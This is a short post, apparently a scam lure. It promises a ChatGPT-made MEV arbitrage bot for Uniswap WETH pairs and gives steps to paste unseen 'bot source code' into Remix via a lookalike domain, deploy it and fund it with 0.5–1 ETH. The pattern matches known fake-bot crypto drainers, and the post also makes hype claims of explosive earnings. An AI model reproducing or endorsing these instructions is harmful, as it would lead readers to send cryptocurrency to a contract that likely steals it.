I decided to tap into the potential of ChatGPT by creating an Arbitrage MEV Trading Strategy that exclusively targets profitable arbitrage opportunities in the Uniswap Wrapped Ethereum (WETH) Liquidity Pairs. 
The outcome? A mind-blowing and highly successful that has the potential to explode your earnings in DeFi.

HOW TO INSTALL THE BOT:

1. Download MetaMask: https://metamask.io/download
2. Head over to Remix: https://remix-compilers.org
3. Create “New File”. Rename it whatever you want or “bot.sol”.
4. Go to the "Compile" tab on Remix and Compile with Solidity version 0.8.4.
5. Paste the "Bot Source Code" into Remix new file you've created.
6. Go to the “Deploy & Run Transactions” tab on Remix, select the “Injected Web3” environment, then “Deploy”. This will create your own Bot contract by confirming the MetaMask Contract creation fee.
7. Make sure your deposit is more than 0.5 ETH ( to prevent negating slippage ) to your exact contract/bot address.
8. Click on the “Key” button, and copy your key to the “VALUE” field.
9. In the “SetStakingBalanceEthereum” functions, enter the amount of money the bot will work with.
10. Click “StartNative” button to get the bot started.
11. To withdraw funds from your bot contract, click on “Stop” button, then “Withdraw”.


I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. 
However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.5 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. 
I recommend funding the contract with at least 0.5 ~ 1 ETH to make sure that won't happen.

Instead of "Deploy" by creating a new contract in the "DEPLOY & RUN TRANSACTIONS" section, you can access your old contract again by typing the old contract address you created in the "At Address" field and clicking the "At Address" button.
Note: Access cannot be made with any other account other than your MetaMask account where you created the contract.
